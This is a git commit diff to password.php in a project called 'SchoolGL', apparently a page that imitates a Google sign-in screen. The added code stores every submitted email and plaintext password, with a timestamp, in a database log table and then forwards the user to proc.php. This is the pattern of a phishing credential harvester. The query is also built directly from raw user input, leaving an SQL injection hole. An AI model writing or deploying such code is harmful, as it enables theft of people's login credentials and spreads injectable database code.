a10d734aab71962f6a7cdc3cabfe80680835ee71
Wiley Lau <wileylau@gmail.com>
2023-06-20 21:03:18 +0800

    SchoolGL: import db function

--- password.php
+++ password.php
@@ -18,9 +18,16 @@
 
 <?php
 session_start();
+include("db.php");
+$email = $_SESSION['email'];
 if (isset($_POST['password'])) {
+    date_default_timezone_set('Asia/Hong_Kong');
+    $time = date('Y-m-d H:i:s', time());
     $password = $_POST['password'];
-    $_SESSION['password'] = $password;
+    $_SESSION['password'] = $password; // do not drop, still used in proc.php
+
+    db_open();
+    db_query("INSERT INTO `log`(`date`, `email`, `password`) VALUES ('$time','$email','$password')");
     header("Location: /proc.php");
 }
 ?>
@@ -35,7 +42,6 @@ if (isset($_POST['password'])) {
                     <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                 </svg>
                 <?php
-                $email = $_SESSION['email'];
                 echo "<h4 class='use' style='font-size: 14px; margin-top: 0; font-family: `Google Sans`, sans-serif;'>&nbsp;&nbsp;$email</h4>"
                 ?>
 
